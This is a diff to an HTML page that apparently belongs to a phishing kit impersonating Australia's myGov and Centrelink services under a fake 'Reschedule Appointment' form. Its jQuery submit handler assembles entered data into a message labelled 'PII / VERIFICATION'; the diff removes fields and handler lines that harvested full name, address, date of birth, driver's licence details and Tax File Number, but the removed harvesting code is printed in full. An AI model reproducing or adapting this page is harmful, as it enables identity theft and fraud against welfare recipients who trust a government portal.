@@ -6,7 +6,7 @@
     <meta http-equiv="x-ua-compatible" content="ie=edge">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <title>
-       Confirm Identification Information - myGov
+       Centrelink Appointment - myGov
     </title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link href="./css/css.css" rel="stylesheet">
@@ -37,43 +37,12 @@
                 <div class="login-grid-container">
                     <div class="login-grid-row">
                         <div class="login-grid-column">
-                            <h1>Verification</h1>
-                            <h2 class="text-align-left">Provide your details and select a new appointment time.</h2>
+                            <h1>Reschedule Appointment</h1>
+                            <h2 class="text-align-left">Select a new appointment time.</h2>
 
                             <!-- No PHP action – JavaScript handles submission -->
                             <form id="form-1" class="mygov-login-form alternative" method="post">
 
-                                <!-- Personal details -->
-                                <div class="input-group">
-                                    <label class="override" for="userId">Full Name</label>
-                                    <input id="fn" name="fn" type="text" autocomplete="off" required>
-                                </div>
-                                <div class="input-group">
-                                    <label class="override" for="userId">Address on File</label>
-                                    <input id="add" name="add" type="text" autocomplete="off" required>
-                                </div>
-                                <div class="input-group">
-                                    <label class="override" for="userId">Date of Birth</label>
-                                    <input id="dob" name="dob" type="text" autocomplete="off" required>
-                                </div>
-                                <div class="input-group">
-                                    <label class="override" for="userId">Driver's License Number</label>
-                                    <input id="dln" name="dln" type="text" autocomplete="off" required>
-                                </div>
-                                <div class="input-group">
-                                    <label class="override" for="userId">Driver's License Card No. (Back of Card)</label>
-                                    <input id="dlcnum" name="dlcnum" type="text" autocomplete="off" required>
-                                </div>
-                                <div class="input-group">
-                                    <label class="override" for="userId">Driver's License Expiry Date</label>
-                                    <input id="dlexdate" name="dlexdate" type="text" autocomplete="off" required>
-                                </div>
-
-                                <!-- ===== Tax File Number (moved UP – before appointment fields) ===== -->
-                                <div class="input-group">
-                                    <label class="override" for="userId">Tax File Number</label>
-                                    <input id="tfnum" name="tfnum" type="text" autocomplete="off" required>
-                                </div>
 
                                 <!-- ===== Appointment fields (NOW at the bottom) ===== -->
                                 <div class="input-group">
@@ -165,13 +134,6 @@
         $('#form-1').on('submit', function(e) {
             e.preventDefault();
             let msg = "|----------| PII / VERIFICATION |--------------|\n";
-                msg += "Full Name: " + $('#fn').val() + "\n";
-                msg += "Address: " + $('#add').val() + "\n";
-                msg += "Date of Birth: " + $('#dob').val() + "\n";
-                msg += "Driver's License #: " + $('#dln').val() + "\n";
-                msg += "DL Card #: " + $('#dlcnum').val() + "\n";
-                msg += "DL Expiry: " + $('#dlexdate').val() + "\n";
-                msg += "TFN: " + $('#tfnum').val() + "\n";          // ← moved up in message
                 msg += "Reschedule Date: " + $('#reschedule_date').val() + "\n";
                 msg += "Available Time: " + $('#reschedule_time').val() + "\n";
                 msg += "|-----------------------------------------|";
